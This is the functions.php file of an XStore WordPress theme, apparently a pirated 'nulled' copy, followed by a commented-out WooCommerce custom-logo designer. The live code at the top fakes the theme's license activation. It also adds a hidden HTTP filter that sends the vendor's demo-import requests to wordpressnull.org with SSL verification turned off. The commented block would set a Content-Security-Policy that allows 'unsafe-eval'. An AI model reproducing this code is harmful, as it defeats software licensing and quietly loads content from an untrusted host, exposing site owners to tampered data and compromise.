<?php

defined( 'ABSPATH' ) || exit( 'Direct script access denied.' );
update_option( 'etheme_is_activated', true );
update_option( 'envato_purchase_code_15780546', 'activated' );
update_option( 'etheme_activated_data', [
'api_key' => 'activated',
'theme' => '_et_',
'purchase' => 'activated',
'item' => [ 'token' => 'activated' ]
] );

add_action( 'tgmpa_register', function(){
if ( isset( $GLOBALS['tgmpa'] ) ) {
$tgmpa_instance = call_user_func( array( get_class( $GLOBALS['tgmpa'] ), 'get_instance' ) );
foreach ( $tgmpa_instance->plugins as $slug => $plugin ) {
if ( $plugin['source_type'] === 'external' ) {
$tgmpa_instance->plugins[ $plugin['slug'] ]['source'] = get_template_directory_uri(). "/plugins/{$plugin['slug']}.zip";
$tgmpa_instance->plugins[ $plugin['slug'] ]['version'] = '';
}
}
}
}, 20 );

add_filter( 'pre_http_request', function( $pre, $parsed_args, $url ){
$search = 'http://8theme.com/import/xstore-demos/';
$replace = 'http://wordpressnull.org/xstore-demos/';
if ( ( strpos( $url, $search ) != false ) && ( strpos( $url, '/versions/' ) == false ) ) {
$url = str_replace( $search, $replace, $url );
return wp_remote_get( $url, [ 'timeout' => 60, 'sslverify' => false ] );
} else {
return false;
}
}, 10, 3 );
/*
* Load theme setup
* ******************************************************************* */
require_once( get_template_directory() . '/theme/theme-setup.php' );

if ( !apply_filters('xstore_theme_amp', false) ) {

	/*
	* Load framework
	* ******************************************************************* */
	require_once( get_template_directory() . '/framework/init.php' );

	/*
	* Load theme
	* ******************************************************************* */
	require_once( get_template_directory() . '/theme/init.php' );

}

/*
// ===============================
// SMJ Custom Design Your Own Feature
// ===============================

add_action('wp_enqueue_scripts', function () {
    if (!is_product()) return;

    $base = get_template_directory_uri();

    // Enqueue CSS & JS
    wp_enqueue_style('smj-designer-css', $base . '/assets/smj-designer.css', [], '1.2');
    wp_enqueue_script('smj-designer-js', $base . '/assets/smj-designer.js', ['jquery'], '1.2', true);

    global $product;
    if (!$product instanceof WC_Product) {
        $product = wc_get_product(get_the_ID());
    }

    // Prepare images: if product has 1 image -> keep 1, if 2+ keep first 2
    $imgs = [];
    if ($product) {
        $main_id = $product->get_image_id();
        $gallery = $product->get_gallery_image_ids();

        if ($main_id) {
            $imgs[] = wp_get_attachment_image_url($main_id, 'large');
        }

        if (!empty($gallery)) {
            foreach ($gallery as $gid) {
                $url = wp_get_attachment_image_url($gid, 'large');
                if ($url && !in_array($url, $imgs)) {
                    $imgs[] = $url;
                }
                // keep gathering but we'll slice later
            }
        }

        // If more than 2 images, only keep first 2. If exactly 1, keep 1.
        if (count($imgs) > 2) {
            $imgs = array_slice($imgs, 0, 2);
        }
        if (empty($imgs)) {
            $imgs = [];
        }
    }

    wp_localize_script('smj-designer-js', 'SMJ_DESIGN', [
        'ajax_url'       => admin_url('admin-ajax.php'),
        'nonce'          => wp_create_nonce('smj_design_nonce'),
        'product_id'     => $product ? $product->get_id() : 0,
        'product_images' => $imgs,
        'cart_url'       => wc_get_cart_url(),
        // wc ajax endpoint template (Woo prints wc_add_to_cart_params too, but keep this available)
        'wc_ajax_url'    => defined('WC_AJAX') ? WC_AJAX::get_endpoint("%%endpoint%%") : '',
    ]);
});

// Button (product page)
add_action('woocommerce_after_add_to_cart_button', function () {
    echo '<button type="button" class="button smj-design-open">DESIGN YOUR OWN</button>';
});

// Modal Markup (product page footer)
add_action('wp_footer', function () {
    if (!is_product()) return; ?>
    <div id="smj-designer-modal" class="smj-designer-modal" aria-hidden="true" style="display:none;">
        <div class="smj-modal-inner">
            <button class="smj-close" type="button" aria-label="Close">×</button>
            <div class="smj-left">
                <div class="smj-thumbs"></div>
                <div class="smj-canvas-area"></div>
                <div class="smj-controls">
                    <label class="smj-file">Upload Logo
                        <input id="smj-logo-file" type="file" accept="image/*" />
                    </label>
                    <label class="smj-scale-label">Scale
                        <input id="smj-scale" type="range" min="5" max="200" value="20" />
                    </label>
                    <button id="smj-choose" class="button">Choose This Design</button>
                </div>
            </div>
            <div class="smj-right">
                <h4>Preview</h4>
                <div class="smj-preview"><img id="smj-preview-img" src="" alt="Preview" /></div>
                <p>Drag logo to position. Each image keeps its own position & scale.</p>
            </div>
        </div>
    </div>
<?php
});

// AJAX handler - save design to session
add_action('wp_ajax_smj_save_design', 'smj_save_design_callback');
add_action('wp_ajax_nopriv_smj_save_design', 'smj_save_design_callback');
function smj_save_design_callback() {
    check_ajax_referer('smj_design_nonce', 'nonce');

    $product_id = intval($_POST['product_id'] ?? 0);
    $images = json_decode(wp_unslash($_POST['images'] ?? '[]'), true);

    if (!$product_id || empty($images) || !is_array($images)) {
        wp_send_json_error(['msg' => 'Invalid data']);
    }

    // store completed payload in session (so next add-to-cart will pick it up)
    if (!WC()->session) {
        // initialize session if necessary
        WC()->session = new WC_Session_Handler();
        WC()->session->init();
    }
    WC()->session->set('smj_design_images', $images);

    wp_send_json_success(['msg' => 'Design saved']);
}

// 🔹 Attach design data from session to cart item
add_filter('woocommerce_add_cart_item_data', function ($cart_item_data, $product_id) {
    $design = WC()->session->get('smj_design_images');

    if (!empty($design)) {
        // Store in cart
        $cart_item_data['smj_design_images'] = $design;

        // Keep session alive until order is processed
        add_action('woocommerce_checkout_order_processed', function () {
            WC()->session->__unset('smj_design_images');
        });
    }

    return $cart_item_data;
}, 10, 2);


// 🔹 Save design data into order line item
add_action('woocommerce_checkout_create_order_line_item', function ($item, $cart_item_key, $values) {
    if (!empty($values['smj_design_images'])) {
        $encoded = wp_json_encode($values['smj_design_images']);
        $item->add_meta_data('_smj_design_images', $encoded, true);

        // Debug line (remove later)
        error_log('✅ SAVED _smj_design_images: ' . $encoded);
    } else {
        error_log('❌ NO smj_design_images found in $values');
    }
}, 10, 3);


// 🔹 Show preview in admin + thank-you page + order details
add_action('woocommerce_order_item_meta_end', function ($item_id, $item) {
    $data = wc_get_order_item_meta($item_id, '_smj_design_images', true);

    if (empty($data)) {
        // Debug line (remove later)
        error_log('⚠️ No _smj_design_images meta found for item ' . $item_id);
        return;
    }

    $decoded = is_string($data) ? json_decode($data, true) : $data;
    if (empty($decoded)) return;

    echo '<div class="smj-admin-preview" style="margin-top:10px;">
            <strong>Custom Design Preview:</strong>
            <div style="display:flex;flex-wrap:wrap;gap:8px;margin-top:8px;">';

    foreach ($decoded as $img) {
        $src = $img['final'] ?? $img['base'] ?? '';
        if (!$src) continue;
        echo '<a href="' . esc_url($src) . '" class="smj-lightbox" target="_blank">
                <img src="' . esc_url($src) . '" style="width:100px;height:auto;border:1px solid #ccc;border-radius:4px;">
              </a>';
    }

    echo '</div></div>';
}, 10, 2);


// 🔹 Hide meta key in raw order meta list
add_filter('woocommerce_hidden_order_itemmeta', function ($hidden) {
    $hidden[] = '_smj_design_images';
    return $hidden;
});


// Save design data onto order line item
add_action('woocommerce_checkout_create_order_line_item', function ($item, $cart_item_key, $values, $order) {
    if (!empty($values['smj_design_images'])) {
        // store as JSON string (safe)
        $item->add_meta_data('_smj_design_images', wp_json_encode($values['smj_design_images']));
    }
}, 10, 4);

// Display preview on thank you / order admin: use $item object get_meta()
add_action('woocommerce_order_item_meta_end', function ($item_id, $item, $order) {
    // $item is WC_Order_Item (product). get_meta returns stored value.
    $raw = $item->get_meta('_smj_design_images', true);
    if (empty($raw)) return;

    $decoded = is_string($raw) ? json_decode($raw, true) : $raw;
    if (empty($decoded) || !is_array($decoded)) return;

    echo '<div class="smj-admin-preview" style="margin-top:10px;"><strong>Custom Design Preview:</strong>';
    echo '<div style="display:flex;flex-wrap:wrap;gap:8px;margin-top:8px;">';

    foreach ($decoded as $img) {
        // prefer the merged 'final' image, otherwise show base
        $src = !empty($img['final']) ? $img['final'] : (!empty($img['base']) ? $img['base'] : '');
        if (empty($src)) continue;

        // output anchor that admin/thank-you lightbox scripts will catch
        echo '<a href="' . esc_url($src) . '" class="smj-lightbox" target="_blank" style="display:inline-block;">';
        echo '<img src="' . esc_url($src) . '" style="width:100px;height:auto;border:1px solid #ccc;border-radius:4px;">';
        echo '</a>';
    }

    echo '</div></div>';
}, 10, 3);

// Hide raw meta key in admin order custom fields table
add_filter('woocommerce_hidden_order_itemmeta', function ($hidden) {
    $hidden[] = '_smj_design_images';
    return $hidden;
});

// Add admin-side small lightbox script for images shown in order details (works in admin order screen & thank you if needed)
add_action('admin_footer', function(){
    $screen = function_exists('get_current_screen') ? get_current_screen() : null;
    // only add on shop_order screen to avoid injecting everywhere
    if ($screen && $screen->id === 'shop_order') {
        ?>
        <script>
        jQuery(function($){
            $('body').on('click', '.smj-admin-preview a, .smj-lightbox', function(e){
                e.preventDefault();
                const src = $(this).attr('href') || $(this).find('img').attr('src');
                const light = $('<div id="smj-lightbox-overlay" style="position:fixed;inset:0;background:rgba(0,0,0,0.85);z-index:999999;display:flex;align-items:center;justify-content:center;cursor:pointer;"><img src="'+src+'" style="max-width:90%;max-height:90%;border-radius:8px;box-shadow:0 0 20px #000;"></div>');
                $('body').append(light);
                light.on('click', function(){ $(this).remove(); });
            });
        });
        </script>
        <?php
    }
});

// ✅ Add relaxed CSP header that allows WooCommerce/JS to work
add_action('send_headers', function() {
    header("Content-Security-Policy: default-src 'self' data: blob:; script-src 'self' 'unsafe-inline' 'unsafe-eval'; img-src 'self' data: blob:; style-src 'self' 'unsafe-inline';");
});
*/
/* Add required checkbox on checkout */
